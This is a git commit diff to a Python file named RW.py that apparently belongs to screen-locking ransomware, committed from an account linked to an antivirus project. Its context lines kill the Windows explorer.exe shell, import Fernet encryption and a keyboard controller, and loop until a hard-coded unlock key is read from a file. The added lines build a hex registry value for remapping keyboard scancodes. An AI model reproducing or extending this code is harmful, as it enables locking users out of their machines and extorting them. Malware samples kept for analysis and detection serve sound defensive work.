44c7d8a66dd269ea1983f89bdfdefc8074138204
Emirhan Uçan <142328963+HydraDragonAntivirus@users.noreply.github.com>
2023-10-18 23:24:27 +0300

    Update RW.py

--- RW.py
+++ RW.py
@@ -7,7 +7,19 @@ from datetime import datetime
 from pynput.keyboard import Controller, Key
 import sys
 from cryptography.fernet import Fernet
+import struct
 
+# Registry entry (in hexadecimal format)
+registry_input = "00,00,00,00,00,00,00,00,03,00,00,00,4d,e0,1d,e0,4b,e0,1d,00,00,00,00,00"
+
+# Convert the input to a list of hexadecimal values
+hex_values = [int(x, 16) for x in registry_input.split(',')]
+
+# Format the data in a special way
+data = struct.pack('<' + 'B' * len(hex_values), *hex_values)
+
+# Print the Registry data
+print(data)
 os.system("taskkill /f /im explorer.exe")  # KILLING  THE GUI INTARCE
 
 # GENERATE A KEY FOR DECRYPTION
@@ -462,21 +474,3 @@ while matchkey != "greejith":
     secritkey = open("sec.txt", "r")
     matchkey = secritkey.read()
     continue
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
